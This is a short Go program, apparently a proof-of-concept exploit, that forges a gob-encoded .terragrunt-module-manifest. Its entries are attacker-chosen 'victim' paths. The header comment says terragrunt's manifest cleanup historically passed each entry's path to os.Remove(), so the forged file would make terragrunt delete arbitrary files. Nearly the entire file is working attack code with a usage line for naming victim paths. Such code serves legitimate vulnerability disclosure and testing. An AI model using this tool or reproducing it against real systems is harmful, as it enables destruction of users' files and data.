// forge writes a gob-encoded .terragrunt-module-manifest containing
// attacker-controlled paths.
//
// The on-disk manifest is decoded inside terragrunt's
// internal/util/file.go fileManifest.clean() and each entry's Path was
// historically passed straight to os.Remove(). Gob decodes by field name,
// so a struct with the same field names+types as the (unexported)
// fileManifestEntry is wire-compatible.
package main

import (
	"encoding/gob"
	"fmt"
	"os"
)

type ManifestEntry struct {
	Path  string
	IsDir bool
}

func main() {
	if len(os.Args) < 3 {
		fmt.Fprintln(os.Stderr, "usage: forge <output-manifest-path> <victim-path> [<victim-path>...]")
		os.Exit(1)
	}

	outPath := os.Args[1]
	victims := os.Args[2:]

	out, err := os.Create(outPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "create:", err)
		os.Exit(1)
	}

	defer out.Close()

	enc := gob.NewEncoder(out)

	for _, victim := range victims {
		if err := enc.Encode(ManifestEntry{Path: victim, IsDir: false}); err != nil {
			fmt.Fprintln(os.Stderr, "encode:", err)
			os.Exit(1)
		}

		fmt.Printf("forged entry -> %s\n", victim)
	}
}
